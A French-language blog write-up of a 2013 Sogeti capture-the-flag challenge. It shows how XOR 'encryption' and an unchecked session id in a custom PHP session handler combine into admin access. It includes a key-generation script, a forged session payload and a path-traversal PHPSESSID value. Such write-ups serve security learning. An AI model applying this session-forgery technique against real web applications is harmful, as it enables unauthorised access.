---
layout: post
title: Writeup challenge Sogeti
description: Un petit writeup pour le challenge réalisé à l'occasion d'un "security event" organisé par Sogeti.
photo: challenge_sogeti.png
categories: articles
tags: [hacking]
comments: true
---

Dans cet article je vais décrire les étapes nécessaire à la résultion d'un challenge réalisé à l'occasion d'un "security event" organisé par Sogeti le 25 juin 2013.

Sur la page d'accueil le message suivant est présent :

>Ce site web vous propose de stocker vos messages en ligne tout en les chiffrant à l'aide d'un algorithme inviolable.
>Votre but est d'accéder à la zone d'administration du site, une partie du code source est aussi disponible

## Un algorithme inviolable ? ##

Première étape, il va s'intéresser à cette algorithme soit disant inviolable.

Code de la page `add.php` :

{% highlight php linenos %}
<?php

include 'includes/init.php';

if(isset($_POST['message']) && isset($_POST['password']) && strlen($_POST['password']) >= 5)
{
    $name_file = md5(microtime());
    $cipher = cipher_it($_POST['message'], stripslashes($_POST['password']));
    $f = fopen(PASTE_DIRECTORY.$name_file, 'w+');
    fwrite($f, $cipher);
    fclose($f);
    header("Location: show.php?id=".$name_file."&password=".urlencode(stripslashes($_POST['password'])));
    exit;
}

$pagename = "add";
$title = "Nouveau message";
include 'includes/header.php';
?>
{% endhighlight %}

La fonction utlisée pour encoder le message est `cipher_it` et prend en argument le message ainsi qu'un mot de passe pour l'encoder.

Cette même fonction est utilisée pour décoder le message :

{% highlight php linenos %}
<?php

include 'includes/init.php';

if(!isset($_GET['id']) || !isset($_GET['password']) || preg_match("/^[0-9a-f]{32}$/", $_GET['id']) == false)
{
    header("Location: index.php");
    exit;
}

if(!is_file(PASTE_DIRECTORY.$_GET['id']))
{
    header("Location: index.php");
    exit;
}

$f = fopen(PASTE_DIRECTORY.$_GET['id'], "rb");
$content = cipher_it(fread($f, filesize(PASTE_DIRECTORY.$_GET['id'])), $_GET['password']);
fclose($f);

$pagename = "show";
$title = "Voir un message";
include 'includes/header.php';

    echo "<fieldset class=\"event_form\" style='text-align:left;'><pre style='background:transparent;'>".htmlspecialchars($content)."</pre></fieldset>";

include 'includes/footer.php';
?>
{% endhighlight %}

Cela signifie que si l'on applique deux fois la fonction permettant d'encoder le message avec le même mot de passe, on retombe sur le message d'origine. On pense alors à la fonction *xor* souvent utilisée en crypto et qui possède cette propriété. De plus, on observe qu'il est possible d'accéder au message chiffré car la constante *PASTE_DIRECTORY* est définie dans le fichier *consts.php*.

{% highlight php %}
<?php
define('PASTE_DIRECTORY', __DIR__.'/../pastes/');
?>
{% endhighlight %}

Les fichiers seront donc accessibles à partir de cette adresse :

    http://217.109.132.34/challenge/pastes/[MD5]

On va faire un petit test pour vérifier cette hypothèse. Si on chiffre le message test1 avec la clé test1 on se retrouve avec cette url :

    http://217.109.132.34/challenge/show.php?id=56499aff7b85dd3778f3572b1b822176&password=test1

Pour accéder au message chiffré il faut se rendre à l'adresse suivante :

    http://217.109.132.34/challenge/pastes/56499aff7b85dd3778f3572b1b822176

Quand on ouvre le fichier avec un éditeur de texte on se retrouve avec que des zéros :

    0000 0000 00

C'est donc bien la fonction `xor` qui est utilisée pour chiffrer les messages. On est donc désormais en mesure de créer des fichiers sur le serveur dont on maîtrise le contenu.

## Accès à la page d'administration ##

L'objectif premier de ce challenge est d'accéder à la page d'administration, jeton un coup d'oeil au code source :

{% highlight php linenos %}
<?php

include 'includes/init.php';

$pagename = "admin";
$title = "Administration";
include 'includes/header.php';

if(!isset($_SESSION['admin']) || $_SESSION['admin'] !== true)
{
    header("Location: index.php");
    exit;
}

define('ADMIN', true);
include 'admin_ok.php';

include 'includes/footer.php';
?>
{% endhighlight %}

On remarque qu'il n'est possible d'accéder à la page d'administration que si la variable de session admin est à true. Il nous faudrait donc un moyen nous permettant de manipuler la session.

## Gestion des sessions ##

Intéressons nous maintenant aux fichiers `init.php` et `class_session.php` :

{% highlight php linenos %}
<?php
class SuperSessionHandler{
    private $savePath;

    public function open($savePath, $sessionName){
        $this->savePath = $savePath;
        if (!is_dir($this->savePath)) {
            mkdir($this->savePath, 0777);
        }
        return true;
    }

    public function close(){
        return true;
    }

    public function read($id){
        return (string)@file_get_contents("$this->savePath/$id");
    }

    public function write($id, $data){
        return file_put_contents("$this->savePath/$id", $data) === false ? false : true;
    }

    public function destroy($id){
        $file = "$this->savePath/$id";
        if (file_exists($file)) {
            unlink($file);
        }
        return true;
    }

    public function gc($maxlifetime){
        foreach (glob("$this->savePath/*") as $file) {
            if (filemtime($file) + $maxlifetime < time() && file_exists($file)) {
                unlink($file);
            }
        }

        return true;
    }
}
?>
{% endhighlight %}

{% highlight php lineos %}
<?php

include 'includes/fonctions.php';
include 'includes/consts.php';
include 'includes/class_sessions.php';

error_reporting(0);

$s = new SuperSessionHandler();
session_save_path(__DIR__.'/../sessions/');
session_set_save_handler (
        array(&$s, 'open'),
        array(&$s, 'close'),
        array(&$s, 'read'),
        array(&$s, 'write'),
        array(&$s, 'destroy'),
        array(&$s, 'gc')
        );
session_start();
?>
{% endhighlight %}

On remarque qu'une classe a été crée permettant de redéfinir la manière dont seront stockées les sessions, les sessions sont stockée dans le dossier *sessions*. Pour accéder à la session il faut se rendre à l'adresse :

    http://217.109.132.34/challenge/sessions/[PHPSESSID]

Si on regarde de plus près la fonction `read`, il s'avère que le paramètre `id` n'est pas du tout contrôlé !

{% highlight php %}
<?php
    public function read($id){
        return (string)@file_get_contents("$this->savePath/$id");
    }
?>
{% endhighlight %}

On est donc en mesure de choisir le fichier qui sera utilisé comme session est modifiant le `PHPSESSID`.

## Résolution de l'épreuve ##

Si on récapitule :
-   Il nous est possible de créer sur le serveur un fichier au contenu arbitraire
-   Pour accéder à la page d'administration il faut modifier sa session
-   On a de la chance la gestion des sessions est personnalisée

On va donc crée un message chiffré qui sera utilisé comme fichier de session afin de se faire passer pour l'admin. Le contenu du fichier de session avec la variable admin à true ressemble à ça :

    admin|b:1;

Pour obtenir le message chiffré j'ai créé un petit script qui me génère une clé afin que le premier texte chiffré ne contienne que des caractère imprimables.

{% highlight php lineos %}
<?php
function xor_this($string,$key) {
 // Our plaintext/ciphertext
 $text =$string;

 // Our output text
 $outText = '';

 // Iterate through each character
 for($i=0;$i<strlen($text);)
 {
     for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++)
     {
         $outText .= $text{$i} ^ $key{$j};
         //echo 'i='.$i.', '.'j='.$j.', '.$outText{$i}.'<br />'; //for debugging
     }
 }
 return $outText;
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

while(1){
    $key =generateRandomString();
    if(ctype_print(xor_this('admin|b:1;',$key))){
        echo $key."<br/>";
        echo ctype_print(xor_this('admin|b:1;',$key));
        die();
    }
}
?>
{% endhighlight %}

Le principe est simple je génère une chaine de caractère aléatoire de même taille que le texte à chiffrer et je vérifie que le texte obtenu en sortie est constitué uniquement de caractère imprimables avec la fonction `ctype_print`.

Clés qui fonctionnnent :

    Y3BFOWOXlV
    KYNZAPHCcC
    GZV2KSEpds

Une fois que l'on a la clé il suffit de chiffrer le message une première fois avec la clé, pour chiffrer à nouveau le résultat avec cette même clé.

    Clé     : FJQ5VPSStf
    Message : admin|b:1;
    Cipher  : '.<\8,1iE]

    Clé     : FJQ5VPSStf (clé)
    Message : '.<\8,1iE] (cipher)
    Cipher  : admin|b:1;

On se rend à l'adresse du message chiffré et on retrouve bien notre message d'origine

Il ne reste plus qu'a changé la valeur du `PHPSESSID` pour qu'il pointe sur notre message. Pour cela j'ai utilisé l'extension "Edit this cookie" pour Chrome et j'ai remplacé la valeur du `PHPSESSID` par :

    ../pastes/2790cdae372837fbc4347f63990bda54

Et voila si l'on se rend sur la page d'administration le message affiché est désormais :

>Félicitations !
>Le message caché est :
>Si tu es arrivé(e) jusque là c'est que tu peux aller jusqu'Issy !

Au final une épreuve pas très compliquée mais intéressante :)

